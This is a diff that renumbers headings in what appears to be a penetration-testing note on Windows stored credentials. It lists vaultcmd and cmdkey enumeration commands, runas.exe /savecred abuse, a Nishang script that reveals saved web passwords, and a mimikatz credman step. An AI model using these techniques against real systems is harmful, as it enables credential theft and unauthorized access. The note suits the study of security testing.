@@ -20,9 +20,11 @@
 
 
 
-### (1) vaultcmd
+### (1) Enumeration
 
-**1.1** `/list`
+#### 1.1 vaultcmd
+
+**1.1.1** `/list`
 
 By default, Windows has two vaults: **Web** and **Windows machine credentials**. The following command displays the two vaults:
 
@@ -30,7 +32,7 @@ By default, Windows has two vaults: **Web** and **Windows machine credentials**.
 C:\> vaultcmd /list
 ```
 
-**1.2** `/listproperties`
+**1.1.2** `/listproperties`
 
 The following commands will list the properties of the web and windows machine credentials respectively:&#x20;
 
@@ -39,7 +41,7 @@ C:\> vaultcmd /listproperties:"web credentials"
 C:\> vaultcmd /listproperties:"windows credentials"
 ```
 
-**1.3** `/listcreds`
+**1.1.3** `/listcreds`
 
 List more information about the stored credentials (for web and windows machine respectively):
 
@@ -48,15 +50,15 @@ C:\> vaultcmd /listcreds:"web credentials"
 C:\> vaultcmd /listcreds:"windows credentials"
 ```
 
-### (2) cmdkey
+#### 1.2 cmdkey
 
 ```powershell
 C:\> cmdkey /list
 ```
 
-### Retrieving/exploiting stored credentials
+### (2) Retrieving/exploiting stored credentials
 
-#### (1) runas.exe&#x20;
+#### 2.1 runas.exe
 
 We can use the `runas.exe` command to run commands (eg. `cmd.exe`) as a particular user with stored credentials.
 
@@ -70,7 +72,7 @@ C:\> runas.exe /savecred /user:USER cmd.exe
 * `/savecred`: Indicates if the credentials have been previously saved by this user
   * This option is required to tell `runas.exe` to pull the stored credentials
 
-#### (2) GetWebCredentials.ps1
+#### 2.2 GetWebCredentials.ps1
 
 The `vaultcmd` and `cmdkey` commands does not provide methods to show the password. Thus, we have to realy on external PowerShell scripts such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1):
 
@@ -86,7 +88,7 @@ UserName  Resource             Password     Properties
 ...
 ```
 
-### (3) Mimikatz
+#### 2.3 mimikatz
 
 1. `sekulrsa::credman`&#x20;
 
